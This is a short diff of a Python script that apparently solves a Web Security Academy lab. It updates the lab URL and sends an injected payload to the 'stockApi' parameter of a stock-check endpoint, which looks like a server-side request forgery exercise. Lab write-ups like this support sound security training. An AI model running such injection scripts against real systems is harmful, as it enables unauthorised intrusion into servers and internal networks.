@@ -24,7 +24,7 @@ from colorama import Fore
 #########
 
 # change this to your lab URL
-url = "https://0a6f006c034e70848368508e00cf002c.web-security-academy.net"
+url = "https://0a8a003a04c5d33d82a733da000800cf.web-security-academy.net"
 
 print(Fore.BLUE + "⟪#⟫ Injection point: " + Fore.YELLOW + "stockApi")
 
@@ -38,7 +38,7 @@ data =  {
 
 try:
     # fetch the page with the injected payload
-    injection = requests.post(f"{url}/product/stock", data)
+    requests.post(f"{url}/product/stock", data)
 
 except:
     print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
